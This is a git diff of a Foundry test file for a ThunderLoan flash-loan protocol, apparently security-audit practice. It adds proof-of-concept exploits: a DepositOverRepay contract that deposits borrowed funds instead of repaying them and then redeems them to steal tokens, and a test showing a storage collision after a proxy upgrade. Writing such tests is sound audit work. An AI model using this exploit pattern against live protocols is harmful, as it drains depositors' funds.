@@ -11,6 +11,7 @@ import "../mocks/BuffMockPoolFactory.sol";
 import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import "src/interfaces/IFlashLoanReceiver.sol";
+import "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -208,6 +209,42 @@ contract ThunderLoanTest is BaseTest {
         console2.log("Attack Fee: ", attackFee);
         assert(attackFee < normalFeeCost);
     }
+
+    function testUseDepositeInsteadOfRepayToStealFunds()
+        public
+        setAllowedToken
+        hasDeposits
+    {
+        vm.startPrank(user);
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay depositOverRepay = new DepositOverRepay(
+            address(thunderLoan)
+        );
+        tokenA.mint(address(depositOverRepay), fee);
+
+        thunderLoan.flashloan(
+            address(depositOverRepay),
+            tokenA,
+            amountToBorrow,
+            ""
+        );
+        depositOverRepay.redeemMoney();
+        vm.stopPrank();
+        assert(tokenA.balanceOf(address(depositOverRepay)) > 50e18 + fee);
+    }
+
+    function testupgradeStoragrCollision() public {
+        uint256 feeBefore = thunderLoan.getFee();
+        vm.startPrank(thunderLoan.owner());
+        ThunderLoanUpgraded thunderLoanUpgraded = new ThunderLoanUpgraded();
+        thunderLoan.upgradeToAndCall(address(thunderLoanUpgraded), "");
+        uint256 feeAfterUpdate = thunderLoan.getFee();
+        vm.stopPrank();
+        console2.log("Fee Before: ", feeBefore);
+        console2.log("Fee After: ", feeAfterUpdate);
+        assert(feeBefore != feeAfterUpdate);
+    }
 }
 
 contract MFlashLoan is IFlashLoanReceiver {
@@ -256,7 +293,6 @@ contract MFlashLoan is IFlashLoanReceiver {
             // IERC20(token).approve(address(thunderLoan), amount + fee);
             // thunderLoan.repay(IERC20(token), amount + fee);
             IERC20(token).transfer(address(repayAddress), amount + fee);
-
         } else {
             feeTwo = fee;
             //repay
@@ -265,5 +301,34 @@ contract MFlashLoan is IFlashLoanReceiver {
             IERC20(token).transfer(address(repayAddress), amount + fee);
         }
         return true;
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /*initiator*/,
+        bytes calldata /*params*/
+    ) external returns (bool) {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        IERC20(token).approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amt = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amt);
     }
 }
